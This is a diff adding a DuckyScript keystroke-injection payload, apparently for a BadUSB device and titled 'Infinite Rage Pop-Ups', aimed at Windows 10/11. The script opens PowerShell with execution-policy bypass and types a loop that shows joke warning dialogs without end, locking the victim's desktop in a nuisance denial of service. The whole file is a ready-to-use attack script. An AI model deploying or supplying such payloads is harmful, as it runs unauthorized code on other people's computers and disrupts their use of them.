@@ -1,0 +1,14 @@
+\
+REM Title: Infinite Rage Pop-Ups
+REM Description: Spawns an endless stream of irritating message box pop-ups
+REM Target OS: Windows 10/11
+REM Author: DoctorSonic
+
+DELAY 1000
+GUI r
+DELAY 600
+STRING powershell -NoP -NonI -Exec Bypass
+ENTER
+DELAY 1200
+STRING $msgs=@('Have you tried turning it off and on again?','ERROR: Everything is fine.','Your computer needs a hug.','404: Motivation not found.','This is fine. This is totally fine.','CRITICAL: Your keyboard is on fire.','UPDATE: You are doing great!','WARNING: Low coffee levels detected.'); while($true){$m=$msgs[(Get-Random -Max $msgs.Count)];[System.Windows.Forms.MessageBox]::Show($m,'Important System Message',0,48)}
+ENTER
